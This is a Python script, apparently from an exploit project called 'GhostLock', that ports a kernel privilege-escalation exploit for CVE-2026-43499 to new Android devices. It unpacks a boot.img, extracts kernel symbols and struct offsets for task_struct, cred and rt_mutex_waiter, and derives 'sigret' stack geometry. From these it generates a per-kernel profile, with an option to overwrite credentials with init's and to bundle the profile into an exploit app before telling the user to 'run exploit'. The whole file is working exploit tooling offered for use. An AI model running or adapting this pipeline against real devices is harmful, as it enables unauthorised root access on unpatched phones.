#!/usr/bin/env python3
"""
port.py — 一条命令把 boot.img 变成可用的 GLK1 profile（本机型 sigret 链路）

完整流水线（全部纯静态，不需要设备、不需要官方 extract_rs）：

    boot.img ──雕 Image──► Image ──kallsyms 自动定位──► symbols.json
                                   │
                                   ├── BTF 结构偏移（task_struct / cred / rt_mutex_waiter）
                                   ├── derive_punch：sigret 几何（waiter_off / buffer / task / lock）
                                   └── kallsyms 符号偏移（10 个）
                                   ↓
                                GLK1 profile

用法
----
    python tools/port.py <boot.img | Image> [-o OUTDIR] [-n 名称] [--install]
                                  [--full-cred] [--loggers-delta N]
                                  [--phys none|LOAD,OFFSET]

        -o OUTDIR        输出目录（默认 ./ported/）
        -n 名称          输出文件名前缀（默认取内核 release 串）
        --install        生成后同时复制到 APP 的 assets/prebuilt/（按 uname -r 自动匹配）
        --full-cred      完整 cred 拷贝（0xb0 + 4 个 init 引用；GT5 Pro 真机验证版用的就是这个）
        --loggers-delta  slide_loggers_0_1 相对 loggers 的偏移（默认 8；GT5 Pro 验证版用 0）
        --phys           phys 布局；"none" 表示不写（沿用运行时内置值，GT5 Pro 验证版如此）
        --vendor-boot    vendor_boot.img；从它的 kernel_addr 推 phys（MediaTek 官方路径）
        --xbl-config     xbl_config.img；从 memorymap 的 MemLabel=Kernel/DDR 推 phys（qcom 正解）

退出码
------
    0 = 成功且几何可行
    2 = 成功但几何不可行（profile 会生成，但大概率跑不通 —— 说明这个内核形态变了）
    3 = 推导失败（符号/指令模式缺失，需要人工看）
    6 = 内核已打补丁（CVE-2026-43499 不可利用）
"""
import json
import os
import re
import struct
import subprocess
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
import structs as st      # noqa: E402  结构偏移（BTF 优先，无 BTF 时代码推导+族表）
import phys as ph        # noqa: E402  phys 布局（vendor_boot / 默认 / 覆盖）
ROOT = os.path.dirname(HERE)
APP_PREBUILT = os.path.join(ROOT, "kernel-src", "ghostlock-app-main",
                            "app", "src", "main", "assets", "prebuilt")


def run(cmd, **kw):
    return subprocess.run(cmd, capture_output=True, text=True, **kw)


def carve(src, outdir):
    """boot.img → 内核 Image（交给 carve.unpack：v0-v4 / gzip+lz4+xz / OEM 前缀头 / zip 都吃）"""
    import carve as _c
    r = _c.unpack(src, outdir)
    if not r.get("image"):
        sys.exit("[FATAL] 解不出内核：%s（%s）" % (src, "；".join(r.get("notes", []))))
    out = os.path.join(outdir, "Image")
    with open(out, "wb") as f:
        f.write(r["image"])
    print(f"[1/4] 雕出 Image: {len(r['image']):,} bytes "
          f"（容器={r['container']}, 偏移=0x{r['image_offset']:x}"
          + (f", 解压={r['decompress']}" if r.get("decompress") else "") + "）")
    return out


def release_of(img_path):
    data = open(img_path, "rb").read()
    m = re.search(rb"Linux version ([0-9]\S+)", data)
    return m.group(1).decode() if m else None


def main():
    if len(sys.argv) < 2:
        sys.exit(__doc__)
    src = sys.argv[1]
    outdir = os.path.join(os.getcwd(), "ported")
    name = None
    install = False
    full_cred = False
    loggers_delta = 8
    phys = None
    vendor_boot = None
    xbl_config = None
    args = sys.argv[2:]
    i = 0
    while i < len(args):
        a = args[i]
        if a == "-o":
            outdir = args[i + 1]; i += 2
        elif a == "-n":
            name = args[i + 1]; i += 2
        elif a == "--install":
            install = True; i += 1
        elif a == "--full-cred":
            full_cred = True; i += 1
        elif a == "--loggers-delta":
            loggers_delta = int(args[i + 1], 0); i += 2
        elif a == "--vendor-boot":
            vendor_boot = args[i + 1]; i += 2
        elif a == "--xbl-config":
            xbl_config = args[i + 1]; i += 2
        elif a == "--phys":
            phys = "none" if args[i + 1] == "none" else args[i + 1]; i += 2
        else:
            sys.exit(f"未知参数: {a}")
    os.makedirs(outdir, exist_ok=True)

    print("=" * 74)
    print(" GhostLock 移植流水线（boot.img → GLK1，纯静态）")
    print("=" * 74)

    img = carve(src, outdir)
    rel = release_of(img)
    if not rel:
        sys.exit("[FATAL] Image 里找不到 'Linux version' banner")
    print(f"       release = {rel}")

    # 按 release 命名，避免批量处理时互相覆盖（曾因此误判"同 uname 偏移不同"）
    named = os.path.join(outdir, f"Image-{rel}")
    if os.path.abspath(img) != os.path.abspath(named):
        open(named, "wb").write(open(img, "rb").read())
        img = named

    sym = os.path.join(outdir, f"symbols-{rel}.json")
    r = run([sys.executable, os.path.join(HERE, "extract_symbols_auto.py"), img, sym])
    if r.returncode != 0:
        print(r.stdout[-2000:])
        sys.exit("[FATAL] 符号提取失败（见上）")
    n_syms = len(json.load(open(sym, encoding="utf-8")))
    print(f"[2/4] kallsyms: {n_syms:,} 个符号")

    r = run([sys.executable, os.path.join(HERE, "derive_punch.py"), img, sym, "--json"])
    if r.returncode == 6:
        print(r.stdout)
        sys.exit("[ABORT] 该内核已打补丁，profile 无意义")
    if r.returncode != 0:
        print(r.stdout[-3000:] or r.stderr[-3000:])
        sys.exit(3)
    raw = r.stdout[r.stdout.find("{"):] if "{" in r.stdout else r.stdout
    try:
        geo = json.loads(raw)
    except json.JSONDecodeError:
        print(r.stdout[-1500:] or r.stderr[-1500:])
        sys.exit("[FATAL] derive_punch 输出不可解析")
    print(f"[3/4] 几何推导: waiter_off={geo['waiter_off']:#x} buffer={geo['copy_size']:#x} "
          f"waiter_depth={geo['waiter_depth']:#x} D={geo['D']:#x} "
          f"{'✅可行' if geo['feasible'] else '❌不可行'}")

    # ---- 结构偏移（BTF 优先；无 BTF 时用代码推导 + 族表）----
    sr = st.resolve(img, sym, rel)
    sjson = os.path.join(outdir, f"structs-{rel}.json")
    json.dump(sr, open(sjson, "w", encoding="utf-8"), indent=2)
    print(f"       structs: {sr['source']} 置信度={sr['confidence']}")
    for n in sr["notes"]:
        print(f"         - {n}")
    if sr["confidence"] == "low":
        print("         ⚠️ 结构表未验证：profile 可生成，但必须真机验证后再分发")

    # ---- phys ----
    if phys is None:
        pr = ph.probe(image_path=img, vendor_boot=vendor_boot, xbl_config=xbl_config)
        if pr["load"] is not None and pr["source"] != "qcom 默认":
            phys = f"{pr['load']},{pr['offset']}" if pr["offset"] is not None else "none"
            print(f"       phys: 0x{pr['load']:x} / offset="
                  f"{'None' if pr['offset'] is None else hex(pr['offset'])} （{pr['source']}）")
        elif pr["load"] is not None:
            print(f"       phys: 默认 0x{pr['load']:x}/0x{pr['offset']:x}（{pr['source']}）")
        else:
            print(f"       ⚠️ phys: {pr['note']}")

    glk_name = (name or rel) + ".glk1"
    glk = os.path.join(outdir, glk_name)
    cmd = [sys.executable, os.path.join(HERE, "gen_glk1_new_build.py"), sym, rel, glk,
           "--waiter-off", str(geo["waiter_off"]),
           "--buffer", str(geo["copy_size"]),
           "--task-off", str(geo["rt_mutex_waiter"]["task"]),
           "--lock-off", str(geo["rt_mutex_waiter"]["lock"]),
           "--loggers-delta", str(loggers_delta),
           "--structs-json", sjson]
    if full_cred:
        cmd.append("--full-cred")
    if phys is not None:
        cmd += ["--phys", "none"] if phys == "none" else ["--phys"] + phys.split(",")
    r = run(cmd)
    if r.returncode != 0:
        print(r.stdout[-3000:] or r.stderr[-3000:])
        sys.exit("[FATAL] profile 生成失败")
    print(f"[4/4] {r.stdout.strip().splitlines()[0]}")

    if install:
        os.makedirs(APP_PREBUILT, exist_ok=True)
        dst = os.path.join(APP_PREBUILT, rel + ".glk1")
        open(dst, "wb").write(open(glk, "rb").read())
        print(f"      已装入 APP 资产: {dst}")
        print("      重编 APP：./gradlew :app:assembleRelease --no-daemon --no-configuration-cache")

    print()
    print(f"  产物目录: {outdir}")
    print(f"  直接可用: {glk}")
    if not geo["feasible"]:
        print("  ⚠️ 几何不可行 —— 该内核的栈布局变了，需要人工标定（HANDOFF §5）")
        sys.exit(2)
    print("  下一步: 真机验证（重启 → 静置 ≥120s → 跑 exploit），静态推导≠已验证")
    sys.exit(0)


if __name__ == "__main__":
    main()
